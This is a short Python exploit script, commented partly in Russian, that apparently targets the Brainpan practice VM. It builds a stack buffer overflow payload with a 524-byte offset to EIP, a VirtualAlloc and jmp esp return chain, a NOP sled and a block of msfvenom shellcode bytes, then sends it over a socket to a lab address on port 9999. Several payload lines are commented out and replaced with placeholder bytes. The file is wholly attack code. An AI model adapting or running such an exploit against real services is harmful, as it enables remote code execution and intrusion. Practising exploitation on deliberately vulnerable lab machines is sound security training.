import struct

def p32(x): return struct.pack("<I", x)

offset       = 524              # смещение до EIP
addr_VA      = 0x74C737C0       #real VirtualAlloc
addr_jmp_esp = 0x311712f3       # gadget jmp esp

# Собираем payload
payload  = b"A" * offset
payload += b"BCAB" #p32(addr_VA)         # EIP ← VirtualAlloc
#payload += p32(addr_jmp_esp)    # return address for VA (jmp esp)
#payload += p32(0x0)             # lpAddress
#payload += p32(0x1000)          # dwSize
#payload += p32(0x1000)          # flAllocationType (MEM_COMMIT)
#payload += p32(0x40)            # flProtect (PAGE_EXECUTE_READWRITE)
payload += b"X" #b"\x90" * 16         # NOP-sled
#shellcode из msfvenom
payload += b"C" * 300
#payload += b"\xbf\x79\x75\x8c\x13\xdb\xdf\xd9\x74\x24\xf4\x58"
#payload += b"\x29\xc9\xb1\x31\x31\x78\x13\x83\xe8\xfc\x03\x78"
#payload += b"\x76\x97\x79\xef\x60\xd5\x82\x10\x70\xba\x0b\xf5"
#payload += b"\x41\xfa\x68\x7d\xf1\xca\xfb\xd3\xfd\xa1\xae\xc7"
#payload += b"\x76\xc7\x66\xe7\x3f\x62\x51\xc6\xc0\xdf\xa1\x49"
#payload += b"\x42\x22\xf6\xa9\x7b\xed\x0b\xab\xbc\x10\xe1\xf9"
#payload += b"\x15\x5e\x54\xee\x12\x2a\x65\x85\x68\xba\xed\x7a"
#payload += b"\x38\xbd\xdc\x2c\x33\xe4\xfe\xcf\x90\x9c\xb6\xd7"
#payload += b"\xf5\x99\x01\x63\xcd\x56\x90\xa5\x1c\x96\x3f\x88"
#payload += b"\x91\x65\x41\xcc\x15\x96\x34\x24\x66\x2b\x4f\xf3"
#payload += b"\x15\xf7\xda\xe0\xbd\x7c\x7c\xcd\x3c\x50\x1b\x86"
#payload += b"\x32\x1d\x6f\xc0\x56\xa0\xbc\x7a\x62\x29\x43\xad"
#payload += b"\xe3\x69\x60\x69\xa8\x2a\x09\x28\x14\x9c\x36\x2a"
#payload += b"\xf7\x41\x93\x20\x15\x95\xae\x6a\x73\x68\x3c\x11"
#payload += b"\x31\x6a\x3e\x1a\x65\x03\x0f\x91\xea\x54\x90\x70"
#payload += b"\x4f\xaa\xda\xd9\xf9\x23\x83\x8b\xb8\x29\x34\x66"
#payload += b"\xfe\x57\xb7\x83\x7e\xac\xa7\xe1\x7b\xe8\x6f\x19"
#payload += b"\xf1\x61\x1a\x1d\xa6\x82\x0f\x7e\x29\x11\xd3\xaf"
#payload += b"\xcc\x91\x76\xb0"


# Отправляем эксплойт на Brainpan (порт и хост под твою VM)
import socket
s = socket.create_connection(("192.168.56.113", 9999))
s.send(payload)
s.close()
